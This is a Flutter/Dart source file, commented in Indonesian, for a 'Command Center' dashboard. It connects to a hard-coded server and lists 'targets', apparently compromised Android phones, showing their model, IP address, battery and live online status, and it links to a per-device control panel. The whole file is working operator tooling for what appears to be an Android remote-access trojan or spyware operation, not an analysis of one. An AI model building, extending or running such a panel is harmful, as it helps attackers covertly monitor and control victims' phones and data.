import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:ui';
import 'package:video_player/video_player.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;

class DeviceDashboardPage extends StatefulWidget {
  // PERBAIKAN: Username dibuat OPSIONAL dengan default 'Admin'
  // agar kompatibel dengan pemanggilan dari tools_gateway.dart
  final String username;
  
  // SessionKey opsional untuk fleksibilitas
  final String? sessionKey;

  const DeviceDashboardPage({
    super.key, 
    // Tidak lagi required, gunakan default 'Admin' jika tidak dikirim
    this.username = 'Admin', 
    this.sessionKey,
  });

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = "";

  // Konfigurasi Socket untuk Real-Time
  late IO.Socket _socket;

  // Getter untuk username yang aman (tidak pernah null)
  String get _effectiveUsername => widget.username.isNotEmpty ? widget.username : 'Admin';

  @override
  void initState() {
    super.initState();
    _initializeVideo();
    _fetchDevices();
    _initSocket(); 
    
    // Polling backup tiap 10 detik untuk update timer last_seen
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) {
      if (mounted) setState(() {}); 
    });
    
    _searchController.addListener(() {
      setState(() {
        _searchQuery = _searchController.text;
      });
    });
  }

  // Inisialisasi Socket.IO
  void _initSocket() {
    try {
      _socket = IO.io(
        'http://panel-legal.jhonaley.net:3018',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL_${_effectiveUsername}'})
            .enableAutoConnect()
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint("[+] Admin Socket Connected to Dashboard");
      });

      // Menerima update status dari backend
      _socket.on('target_status', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['id']);
            if (index != -1) {
              _devices[index]['status'] = data['status'].toString().toLowerCase() == 'online' ? 'Online' : 'Offline';
              if (data['status'].toString().toLowerCase() == 'online') {
                _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
              }
            }
          });
        }
      });

      // Menerima update baterai/heartbeat
      _socket.on('heartbeat', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['deviceId']);
            if (index != -1) {
              _devices[index]['battery'] = data['battery'];
              _devices[index]['status'] = 'Online';
              _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
            }
          });
        }
      });

      // Device baru terdaftar
      _socket.on('device_info', (data) {
        if (mounted && data['admin'] == _effectiveUsername) {
          _fetchDevices(); 
        }
      });

      _socket.connect();
    } catch (e) {
      debugPrint("Socket error: $e");
    }
  }

  void _initializeVideo() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() {
              _videoInitialized = true;
            });
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(0);
          }
        }).catchError((error) {
          debugPrint('Video initialization error: $error');
          if (mounted) setState(() => _videoError = true);
        });
    } catch (e) {
      debugPrint('Video controller creation error: $e');
      if (mounted) setState(() => _videoError = true);
    }
  }

  @override
  void dispose() {
    _timer?.cancel();
    _socket.disconnect(); 
    _socket.dispose();
    _videoController.dispose();
    _searchController.dispose();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      // Menggunakan _effectiveUsername yang sudah aman (tidak null)
      final response = await http.get(
        Uri.parse("http://panel-legal.jhonaley.net:3018/api/list-targets?username=${_effectiveUsername}"),
      ).timeout(const Duration(seconds: 15)); // Timeout untuk keamanan

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      } else {
        debugPrint("API Error: ${response.statusCode}");
        if (mounted) setState(() => _isLoading = false);
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
      if (mounted) {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  List<dynamic> get _filteredDevices {
    if (_searchQuery.isEmpty) return _devices;
    return _devices.where((d) {
      String searchStr = "${d['model']} ${d['id']} ${d['ip']}".toLowerCase();
      return searchStr.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  // Fungsi Hitung Status Realtime (Threshold 20 Detik)
  bool _isDeviceReallyOnline(dynamic device) {
    if (device['status'] == 'Offline') return false;
    
    if (device['lastSeen'] == null) return false;

    try {
      DateTime lastSeen = DateTime.parse(device['lastSeen'].toString());
      DateTime now = DateTime.now();
      
      if (now.difference(lastSeen).inSeconds > 20) {
        return false;
      }
      return true;
    } catch (e) {
      return false; 
    }
  }

  @override
  Widget build(BuildContext context) {
    int totalCount = _devices.length;
    int activeCount = _devices.where((d) => _isDeviceReallyOnline(d)).length; 
    int offlineCount = totalCount - activeCount;
    final filteredList = _filteredDevices;

    return Scaffold(
      backgroundColor: Colors.black, 
      body: Stack(
        children: [
          // Background Video
          if (_videoInitialized && !_videoError)
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width ?? 1920,
                  height: _videoController.value.size.height ?? 1080,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          else
            Container(color: const Color(0xFF0F1A15)), 

          // Blur Overlay
          BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
            child: Container(
              color: Colors.black.withOpacity(0.6), 
            ),
          ),

          // Main Content
          SafeArea(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Header Section
                Padding(
                  padding: const EdgeInsets.fromLTRB(20, 20, 20, 10),
                  child: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.1),
                          shape: BoxShape.circle,
                        ),
                        child: const Icon(Icons.security, color: Colors.greenAccent, size: 24),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Text(
                              "Command Center",
                              style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold, letterSpacing: 1),
                            ),
                            Text(
                              "Device Management - ${_effectiveUsername.toUpperCase()}",
                              style: TextStyle(color: Colors.white.withOpacity(0.6), fontSize: 10, letterSpacing: 1),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(width: 8),
                      GestureDetector(
                        onTap: () {
                          setState(() => _isLoading = true);
                          _fetchDevices();
                        },
                        child: Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(10),
                          ),
                          child: const Icon(Icons.refresh, color: Colors.white70, size: 20),
                        ),
                      ),
                    ],
                  ),
                ),

                // Stats Boxes
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                  child: Row(
                    children: [
                      _buildStatBox("Total", totalCount.toString(), Colors.white),
                      const SizedBox(width: 10),
                      _buildStatBox("Online", activeCount.toString(), Colors.greenAccent),
                      const SizedBox(width: 10),
                      _buildStatBox("Offline", offlineCount.toString(), Colors.white54),
                    ],
                  ),
                ),

                // Search Bar
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                  child: Container(
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.4),
                      borderRadius: BorderRadius.circular(15),
                      border: Border.all(color: Colors.white.withOpacity(0.1)),
                    ),
                    child: TextField(
                      controller: _searchController,
                      style: const TextStyle(color: Colors.white, fontSize: 14),
                      decoration: InputDecoration(
                        hintText: "Search device, IP, ID...",
                        hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 13),
                        prefixIcon: Icon(Icons.search, color: Colors.white.withOpacity(0.5), size: 18),
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(vertical: 16),
                      ),
                    ),
                  ),
                ),

                const SizedBox(height: 10),

                // Device List
                Expanded(
                  child: _isLoading 
                    ? const Center(child: CircularProgressIndicator(color: Colors.greenAccent))
                    : filteredList.isEmpty 
                      ? Center(
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.devices_other, color: Colors.white.withOpacity(0.3), size: 48),
                              const SizedBox(height: 16),
                              Text(
                                "NO DEVICES FOUND", 
                                style: TextStyle(color: Colors.white.withOpacity(0.5), fontWeight: FontWeight.bold, letterSpacing: 2)
                              ),
                              const SizedBox(height: 8),
                              Text(
                                "Waiting for targets to connect...",
                                style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 12)
                              ),
                            ],
                          )
                        )
                      : ListView.builder(
                          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 5),
                          itemCount: filteredList.length,
                          itemBuilder: (context, index) {
                            final device = filteredList[index];
                            
                            bool isActive = _isDeviceReallyOnline(device); 
                            Color glowColor = isActive ? Colors.greenAccent : Colors.redAccent;

                            return AnimatedContainer(
                              duration: const Duration(milliseconds: 300),
                              margin: const EdgeInsets.only(bottom: 12),
                              padding: const EdgeInsets.all(16),
                              decoration: BoxDecoration(
                                color: Colors.black.withOpacity(0.5),
                                borderRadius: BorderRadius.circular(16),
                                border: Border.all(
                                  color: isActive ? glowColor.withOpacity(0.3) : Colors.white12,
                                  width: 1,
                                ),
                                boxShadow: isActive ? [
                                  BoxShadow(
                                    color: glowColor.withOpacity(0.05),
                                    blurRadius: 15,
                                    spreadRadius: 1,
                                  )
                                ] : [],
                              ),
                              child: InkWell(
                                onTap: () {
                                  Navigator.pushNamed(
                                    context, 
                                    '/control_panel', 
                                    arguments: {
                                      "device": device,
                                      "operator": _effectiveUsername
                                    } 
                                  );
                                },
                                child: Row(
                                  children: [
                                    // Device Icon
                                    Container(
                                      padding: const EdgeInsets.all(12),
                                      decoration: BoxDecoration(
                                        color: isActive ? glowColor.withOpacity(0.15) : Colors.white.withOpacity(0.05),
                                        borderRadius: BorderRadius.circular(12),
                                        border: Border.all(
                                          color: isActive ? glowColor.withOpacity(0.5) : Colors.transparent,
                                        ),
                                      ),
                                      child: Icon(Icons.phone_android, color: isActive ? glowColor : Colors.white54, size: 20),
                                    ),
                                    const SizedBox(width: 16),
                                    
                                    // Device Info
                                    Expanded(
                                      child: Column(
                                        crossAxisAlignment: CrossAxisAlignment.start,
                                        children: [
                                          Text(
                                            device['model'] ?? "Unknown Device",
                                            style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 0.5),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                          const SizedBox(height: 4),
                                          Row(
                                            children: [
                                              Text(
                                                device['release'] != null ? "Android ${device['release']}" : "Android OS",
                                                style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 11),
                                              ),
                                              const SizedBox(width: 8),
                                              Icon(Icons.wifi, color: Colors.white.withOpacity(0.3), size: 12),
                                              if (device['ip'] != null) ...[
                                                const SizedBox(width: 4),
                                                Text(
                                                  device['ip'],
                                                  style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 10),
                                                  overflow: TextOverflow.ellipsis,
                                                ),
                                              ]
                                            ],
                                          ),
                                        ],
                                      ),
                                    ),

                                    // Status Info
                                    Column(
                                      crossAxisAlignment: CrossAxisAlignment.end,
                                      children: [
                                        Row(
                                          mainAxisSize: MainAxisSize.min,
                                          children: [
                                            Container(
                                              width: 8,
                                              height: 8,
                                              decoration: BoxDecoration(
                                                color: glowColor,
                                                shape: BoxShape.circle,
                                                boxShadow: [
                                                  BoxShadow(color: glowColor.withOpacity(0.5), blurRadius: 4, spreadRadius: 1)
                                                ]
                                              ),
                                            ),
                                            const SizedBox(width: 6),
                                            Text(
                                              isActive ? "Online" : "Offline",
                                              style: TextStyle(color: isActive ? Colors.white : Colors.white54, fontSize: 12),
                                            ),
                                          ],
                                        ),
                                        const SizedBox(height: 6),
                                        Row(
                                          mainAxisSize: MainAxisSize.min,
                                          children: [
                                            Icon(Icons.battery_charging_full, color: Colors.white.withOpacity(0.5), size: 12),
                                            const SizedBox(width: 4),
                                            Text(
                                              "${device['battery'] ?? '0'}%", 
                                              style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 11)
                                            ),
                                          ],
                                        ),
                                      ],
                                    ),
                                    
                                    const SizedBox(width: 12),
                                    Icon(Icons.arrow_forward_ios, color: Colors.white.withOpacity(0.2), size: 14),
                                  ],
                                ),
                              ),
                            );
                          },
                        ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatBox(String title, String value, Color valueColor) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 16),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.4),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: Colors.white.withOpacity(0.05)),
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(color: valueColor, fontSize: 20, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 4),
            Text(
              title,
              style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 11, letterSpacing: 1),
            ),
          ],
        ),
      ),
    );
  }
}